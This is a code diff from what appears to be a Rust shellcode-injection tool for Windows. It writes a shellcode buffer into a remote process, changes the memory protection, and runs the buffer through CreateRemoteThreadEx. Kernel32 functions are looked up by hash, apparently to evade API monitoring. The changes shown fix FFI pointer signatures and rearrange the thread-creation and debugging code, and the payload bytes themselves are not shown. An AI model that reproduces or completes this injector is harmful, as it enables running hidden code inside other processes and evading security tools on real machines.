@@ -50,7 +50,7 @@ type TWriteProcessMemory = unsafe extern "system" fn(
     lpbaseaddress: *const c_void,
     lpbuffer: *const c_void,
     nsize: usize,
-    lpnumberofbyteswritten: Option<*mut usize>
+    lpnumberofbyteswritten: *mut usize
 ) -> ();
 
 type TVirtualProtectEx = unsafe extern "system" fn(
@@ -63,13 +63,13 @@ type TVirtualProtectEx = unsafe extern "system" fn(
 
 type TCreateRemoteThreadEx = unsafe extern "system" fn(
     hprocess: HANDLE,
-    lpthreadattributes: Option<*const SECURITY_ATTRIBUTES>,
+    lpthreadattributes: *const SECURITY_ATTRIBUTES,
     dwstacksize: usize,
     lpstartaddress: LPTHREAD_START_ROUTINE,
-    lpparameter: Option<*const c_void>,
+    lpparameter: *const c_void,
     dwcreationflags: u32,
-    lpattributelist: Option<LPPROC_THREAD_ATTRIBUTE_LIST>,
-    lpthreadid: Option<*mut u32>
+    lpattributelist: *mut c_void,
+    lpthreadid: *mut u32
 ) -> HANDLE;
 
 type TWaitForSingleObject = unsafe extern "system" fn(
@@ -240,7 +240,7 @@ fn main() {
             haddr, 
             shellcode.as_ptr() as _,
             shellcode.len(),
-            None,
+            null_mut(),
         );
 
         let mut oldprotect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
@@ -256,6 +256,18 @@ fn main() {
         println!("[+] Creating a Remote Thread");
         let XCreateRemoteThreadEx: TCreateRemoteThreadEx = mem::transmute(getFuncAddressByHash("kernel32.dll", 0x857934) as *const u32);
         
+        //println!("Last Error : {:?}", GetLastError());
+
+        /* let hthread = XCreateRemoteThreadEx(
+            hprocess,
+            null(),
+            0,
+            std::mem::transmute(haddr),
+            null(),
+            0,
+            null_mut(),
+            null_mut(),); */
+        
         let hthread = CreateRemoteThreadEx(
             hprocess,
             Some(null()),
@@ -270,8 +282,6 @@ fn main() {
                 process::exit(-1);
             }
         );
-
-        println!("Last Error : {:?}", GetLastError());
 
         let XWaitForSingleObject: TWaitForSingleObject = mem::transmute(getFuncAddressByHash("kernel32.dll", 0x397566) as *const u32);
         XWaitForSingleObject(hthread, INFINITE);
